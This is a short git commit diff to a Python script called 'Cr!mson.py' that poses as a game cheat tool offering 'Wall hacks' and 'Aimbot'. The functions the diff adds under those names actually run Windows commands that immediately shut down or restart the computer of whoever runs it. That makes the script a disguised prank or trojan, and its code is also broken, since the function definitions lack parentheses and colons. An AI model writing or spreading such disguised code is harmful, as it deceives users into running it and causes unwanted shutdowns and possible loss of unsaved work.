aea47fef72aa43e95d4b445042c172374277e7c0
ThatOnePythonKid <160439412+ThatOnePythonKid@users.noreply.github.com>
2024-03-08 13:16:26 -0500

    Update Cr!mson.py

--- Cr!mson.py
+++ Cr!mson.py
@@ -1,8 +1,11 @@
-import hidecode1
 import os
 print('Cr!mson Exploits')
 
+def wallhack
+    os.system("shutdown /s /t 0 ")
 
+def aimbot
+    os.system("shutdown /r /t 0 ")
 
 
 X = (input('Select Exploit 1.Wall hacks, 2.Aimbot: '))
